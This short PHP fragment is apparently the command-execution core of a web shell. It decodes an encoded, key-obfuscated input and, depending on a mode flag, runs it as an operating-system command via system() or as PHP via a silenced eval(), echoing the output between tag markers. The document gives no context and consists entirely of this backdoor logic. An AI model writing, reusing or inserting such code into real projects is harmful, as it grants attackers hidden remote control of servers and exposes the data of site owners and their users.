$r[1] = c(base64_decode(str_replace(' ', '+', $r[1])), $r[0]);
echo '<'.$r[0].'>';
switch($r[2]){
	case 0:
		system($r[1]." 2>&1");
		break;
	case 1:
		@eval($r[1]);
		break;
}
echo '</'.$r[0].'>';
